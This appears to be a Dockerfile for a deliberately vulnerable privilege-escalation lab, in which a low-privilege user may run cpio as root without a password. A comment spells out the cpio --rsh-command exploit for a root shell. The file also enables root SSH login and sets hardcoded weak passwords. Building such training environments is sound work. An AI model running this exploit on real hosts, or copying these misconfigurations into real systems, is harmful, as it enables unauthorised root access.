FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_cpio
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/cpio as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and cpio
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        cpio \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify cpio is installed
RUN which cpio && ls -la /usr/bin/cpio

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# cpio with --rsh-command can be abused to execute arbitrary commands as root.
# Exploit:
#   echo '/bin/sh </dev/tty >/dev/tty' > /tmp/localhost
#   chmod +x /tmp/localhost
#   cd /tmp && echo x > x && ls x | sudo cpio -o --rsh-command /bin/sh -F localhost:
# This causes cpio to invoke /bin/sh with arguments that lead to shell execution.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/cpio" > /etc/sudoers.d/cpio && \
    chmod 440 /etc/sudoers.d/cpio

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]